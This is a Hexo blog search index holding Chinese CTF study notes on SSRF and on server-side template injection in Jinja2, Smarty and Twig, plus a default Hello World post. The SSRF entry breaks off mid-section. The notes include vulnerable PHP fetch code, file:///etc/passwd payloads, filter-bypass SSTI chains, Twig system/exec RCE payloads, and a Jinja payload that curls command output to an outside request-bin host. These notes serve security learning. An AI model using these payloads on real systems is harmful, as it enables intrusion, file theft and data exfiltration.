<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-SSRF</title>
      <link href="/2021/07/28/ctf-ssrf/"/>
      <url>/2021/07/28/ctf-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-SSRF"><a href="#Web-SSRF" class="headerlink" title="Web-SSRF"></a><strong>Web-SSRF</strong></h1><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/08/01/2ZcPWqDef1HUIt8.png"></h4><hr><h3 id="一·SSRF简介"><a href="#一·SSRF简介" class="headerlink" title="一·SSRF简介"></a><strong>一·SSRF简介</strong></h3><p>SSRF（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）</p><p>Example：</p><pre class="line-numbers language-none"><code class="language-none">GET /index.php?url=http://google.com/ HTTP/1.1 Host: example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，<a href="http://example.com/">http://example.com</a> 从它的服务器获取 <a href="http://google.com/">http://google.com</a></p><p><img src="https://i.loli.net/2021/08/01/YszZNIimFTfML3A.png"></p><p><strong>容易出现SSRF的地方有：</strong></p><table><thead><tr><th>社交分享功能：获取超链接的标题等内容进行显示</th></tr></thead><tbody><tr><td>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</td></tr><tr><td>在线翻译：给网址翻译对应网页的内容</td></tr><tr><td>图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片</td></tr><tr><td>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</td></tr><tr><td>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</td></tr><tr><td>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</td></tr><tr><td>数据库内置功能：数据库的比如mongodb的copyDatabase函数</td></tr><tr><td>邮件系统：比如接收邮件服务器地址</td></tr><tr><td>编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</td></tr><tr><td>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</td></tr><tr><td>从远程服务器请求资源</td></tr></tbody></table><p><strong>SSRF漏洞的危害：</strong></p><table><thead><tr><th>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</th></tr></thead><tbody><tr><td>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</td></tr><tr><td>对内网Web应用进行指纹识别，识别企业内部的资产信息。</td></tr><tr><td>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</td></tr><tr><td>利用file协议读取服务器本地文件等。</td></tr><tr><td>进行跳板攻击等。</td></tr></tbody></table><hr><h3 id="二·SSRF漏洞相关函数和类"><a href="#二·SSRF漏洞相关函数和类" class="headerlink" title="二·SSRF漏洞相关函数和类"></a><strong>二·SSRF漏洞相关函数和类</strong></h3><ul><li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p></li><li><p>readfile()：输出一个文件的内容。</p></li><li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p></li><li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p></li><li><p>fopen()：打开一个文件文件或者 URL。</p></li><li><p>……</p><p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p></li></ul><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似 <code>ssrf.php?url=../../../../../etc/passwd</code> 的paylaod即可读取服务器本地的任意文件。</p><p>readfile()函数与file_get_contents()函数相似。</p><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<br>fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$host=$_GET['url'];$fp = fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) {    echo "$errstr ($errno)&lt;br /&gt;\n";} else {    $out = "GET / HTTP/1.1\r\n";    $out .= "Host: $host\r\n";    $out .= "Connection: Close\r\n\r\n";    fwrite($fp, $out);    while (!feof($fp)) {        echo fgets($fp, 128);    }    fclose($fp);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>但是该函数的SSRF无法读取本地文件。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p><p>测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>也可以使用file协议读取本地文件</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 <code>__call</code> 方法，那么 <code>__call</code> 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第一个参数是用来指明是否是wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li></ul><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://47.xxx.xxx.72:2333', 'location'=&gt;'http://47.xxx.xxx.72:2333/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：</p><p>由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p><h3 id="三·SSRF漏洞利用的相关协议"><a href="#三·SSRF漏洞利用的相关协议" class="headerlink" title="三·SSRF漏洞利用的相关协议"></a><strong>三·SSRF漏洞利用的相关协议</strong></h3><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><p>下面我们对这些协议的利用进行逐一演示。</p><h4 id="常见利用方式（file、http-s和dict协议）"><a href="#常见利用方式（file、http-s和dict协议）" class="headerlink" title="常见利用方式（file、http/s和dict协议）"></a>常见利用方式（file、http/s和dict协议）</h4><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p><p>以下几个演示所用的测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="读取内网文件（file协议）"><a href="#读取内网文件（file协议）" class="headerlink" title="读取内网文件（file协议）"></a>读取内网文件（file协议）</h5><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p><pre class="line-numbers language-none"><code class="language-none">ssrf.php?url=file:///etc/passwdssrf.php?url=file:///var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="探测内网主机存活（http-s协议）"><a href="#探测内网主机存活（http-s协议）" class="headerlink" title="探测内网主机存活（http/s协议）"></a>探测内网主机存活（http/s协议）</h5><p>一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p><p>域网IP地址范围分三类，以下IP段为内网IP段：</p><pre class="line-numbers language-none"><code class="language-none">C类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试环境如下：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF SSTI</title>
      <link href="/2021/07/27/ctf-ssti/"/>
      <url>/2021/07/27/ctf-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://i.loli.net/2021/07/28/hYPU4l68D7xAg9Z.png"></p><hr><h3 id="二丶渲染模板（flask-jinja）"><a href="#二丶渲染模板（flask-jinja）" class="headerlink" title="二丶渲染模板（flask/jinja）"></a><strong>二丶渲染模板（flask/jinja）</strong></h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><table><thead><tr><th align="left"><strong>dict</strong></th><th>保存类实例或对象实例的属性变量键值对字典</th></tr></thead><tbody><tr><td align="left"><strong>class</strong></td><td>返回类型所属的对象</td></tr><tr><td align="left"><strong>mro</strong></td><td>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</td></tr><tr><td align="left">bases</td><td>返回该对象所继承的基类</td></tr><tr><td align="left"><strong>subclasses</strong></td><td>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</td></tr><tr><td align="left"><strong>init</strong></td><td>类的初始化方法</td></tr><tr><td align="left">globals</td><td>对包含函数全局变量的字典的引用</td></tr></tbody></table><h5 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a><strong>一些姿势</strong></h5><ul><li><p>[浅析SSTI(python沙盒绕过)]: </p></li><li><p><strong>config</strong></p><p><code>{{config}}</code>可以获取当前设置，如果题目类似<code>app.config ['FLAG'] = os.environ.pop（'FLAG'）</code>，那可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>得到flag</p></li><li><p><strong>self</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{self\}\} ⇒ &lt;TemplateReference None&gt;</span><br><span class="line">{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>[]  ()  “”</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}</code></p></li><li><p>url_for,g,request,namespace,lipsum,range,session,dict,get_flashed_message,config</p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{{url_for.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{get_flashed_messages.__globals__['current_app'].config.FLAG}}</span><br><span class="line">{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}</span><br></pre></td></tr></tbody></table></figure></li></ul><h5 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a><strong>常用绕过</strong></h5><ol><li><p>以下表示法可用于访问对象的属性：</p><ul><li><code>request.__class__</code></li><li><code>request["__class__"]</code></li><li><code>request|attr("__class__")</code></li></ul></li><li><p>可以使用以下方法访问数组元素：</p><ul><li><code>array[0]</code></li><li><code>array.pop(0)</code></li><li><code>array.__getitem__(2)</code></li></ul></li><li><p>过滤[]和.</p><p>只过滤<code>[]</code>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()</code><br> 若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code>将<code>request.__class__</code>改成<code>request|attr("__class__")</code></p></li><li><p>过滤_</p><p>利用<code>request.args</code>属性</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`</span><br></pre></td></tr></tbody></table></figure><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p></li><li><p>关键词过滤</p><ul><li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>​      例如被过滤掉<code>__class__</code>关键词</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br></pre></td></tr></tbody></table></figure><ul><li><p>字符串拼接绕过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</span><br><span class="line">{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p>过滤  {   {</p><p>使用{ % if … %}1{ % endif  % }，例如</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')%}1{% endif %}</span><br></pre></td></tr></tbody></table></figure><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%}1{% endif%}</span><br></pre></td></tr></tbody></table></figure></li><li><p>引号内十六进制绕过</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{"".__class__}}</span><br><span class="line">{{""["\x5f\x5fclass\x5f\x5f"]}}</span><br></pre></td></tr></tbody></table></figure><p>_<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</p></li><li><p>“ ‘ chr等被过滤，无法引入字符串</p><ul><li>直接拼接键名</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(buil=aa,tins=dd)|join()</span><br></pre></td></tr></tbody></table></figure><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(app.__doc__|list()).pop(102)|string()</span><br></pre></td></tr></tbody></table></figure><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c</span><br><span class="line">{%set i1=dict(a=i1,c=udl%(99)).values()|join %}</span><br></pre></td></tr></tbody></table></figure></li><li><p>+被过滤，无法拼接字符串</p></li></ol><ul><li><code>~</code><br> 在jinja中可以拼接字符串</li><li>格式化字符串<br> 同上</li></ul><hr><h3 id="三丶Smarty"><a href="#三丶Smarty" class="headerlink" title="三丶Smarty"></a><strong>三丶Smarty</strong></h3><p><a href="https://www.jianshu.com/p/eb8d0137a7d3">Smarty SSTI</a></p><ol><li><p>{php}{/php}</p><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p></li><li><p>{literal}</p><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p><p>那么对于php5的环境我们就可以使用</p><script language="php">phpinfo();</script></li><li><p>{if}</p><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等</p></li><li><p>getStreamVariable</p><p>新版本失效<br> <code>{self::getStreamVariable("file:///etc/passwd")}</code></p><hr><h3 id="四丶twig"><a href="#四丶twig" class="headerlink" title="四丶twig"></a><strong>四丶twig</strong></h3><p><strong>文件读取</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{{'/etc/passwd'|file_excerpt(1,30)}}</span><br><span class="line"></span><br><span class="line">{{app.request.files.get(1).__construct('/etc/passwd','')\}\}</span><br><span class="line">{{app.request.files.get(1).openFile.fread(99)\}\}</span><br></pre></td></tr></tbody></table></figure><p><strong>rce</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")}}</span><br><span class="line"></span><br><span class="line">{{['cat /etc/passwd']|filter('system')}}</span><br><span class="line"></span><br><span class="line">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span><br><span class="line">{{app.request.query.filter(0,0,1024,{'options':'system'})}}</span><br></pre></td></tr></tbody></table></figure></li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/27/hello-world/"/>
      <url>/2021/07/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
